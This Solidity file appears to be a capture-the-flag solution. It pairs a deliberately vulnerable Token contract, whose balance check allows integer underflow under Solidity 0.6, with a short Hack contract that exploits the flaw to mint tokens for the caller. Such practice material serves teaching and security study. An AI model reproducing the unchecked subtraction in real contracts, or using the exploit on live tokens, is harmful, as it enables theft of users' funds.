// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // safe math is not enabled!

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // prevent transferring more tokens than the balance of msg.sender
    balances[msg.sender] -= _value;  // underflow possible
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

interface IToken {

  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address _owner) external  view returns (uint);
}

contract Hack {
  constructor(address _target){
    IToken(_target).transfer(msg.sender,21);
  }
}